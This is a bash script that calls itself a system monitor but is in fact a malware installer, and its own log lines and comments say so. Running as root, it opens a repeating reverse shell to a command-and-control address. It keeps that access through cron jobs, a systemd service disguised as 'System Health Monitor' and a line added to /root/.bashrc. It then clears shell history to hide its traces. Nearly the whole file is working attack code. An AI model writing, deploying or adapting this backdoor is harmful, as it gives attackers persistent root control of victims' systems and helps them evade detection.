#!/bin/bash
#
# Simplified System Monitor - Raw Reverse Shell Only
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Configuration
INSTALL_DIR="/usr/lib/systemd/system-monitor"
SERVICE_NAME="system-health-monitor"
C2_SERVER="192.168.1.167"
C2_PORT="4445"

# Reverse Shell Function
start_reverse_shell() {
    log_info "Starting reverse shell..."
    nohup bash -c "while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null; sleep 30; done" >/dev/null 2>&1 &
    
    sleep 2
    if pgrep -f "bash.*$C2_SERVER" >/dev/null; then
        log_success "Reverse shell is running"
    else
        log_warn "Reverse shell may not have started"
    fi
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root"
        exit 1
    fi
    log_info "Prerequisites satisfied"
}

setup_environment() {
    log_info "Setting up environment..."
    mkdir -p "$INSTALL_DIR"
    chmod 700 "$INSTALL_DIR"
    log_success "Environment setup completed"
}

setup_persistence() {
    log_info "Setting up persistence..."
    
    # Cron persistence
    CRON_JOBS=(
        "*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1' >/dev/null 2>&1"
        "@reboot /bin/bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1' >/dev/null 2>&1"
    )
    
    current_cron=$(crontab -l 2>/dev/null || true)
    for job in "${CRON_JOBS[@]}"; do
        if ! grep -Fq "$job" <<< "$current_cron"; then
            current_cron+="$job"$'\n'
        fi
    done
    echo "$current_cron" | crontab -
    
    # Systemd service
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null; sleep 60; done"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME.service"
    systemctl start "$SERVICE_NAME.service"
    
    # Profile persistence
    echo "nohup bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1' >/dev/null 2>&1 &" >> /root/.bashrc
    
    log_success "Persistence configured"
}

cleanup() {
    log_info "Cleaning up..."
    rm -f /tmp/deploy_*.sh
    history -c
    log_success "Cleanup completed"
}

show_status() {
    log_info "=== Deployment Status ==="
    echo "Installation Directory: $INSTALL_DIR"
    echo "C2 Server: $C2_SERVER:$C2_PORT"
    echo "Service Status: $(systemctl is-active $SERVICE_NAME.service 2>/dev/null || echo 'not-found')"
    echo "Reverse Shell Processes: $(pgrep -f "bash.*$C2_SERVER" | wc -l)"
    echo "Cron Jobs: $(crontab -l | grep -c "$C2_SERVER")"
}

main() {
    log_info "Starting Simplified Malware Deployment..."
    
    check_prerequisites
    setup_environment
    setup_persistence
    start_reverse_shell
    cleanup
    show_status
    
    log_success "Deployment completed successfully!"
    log_info "Reverse shell will maintain persistence across reboots"
}

main "$@"
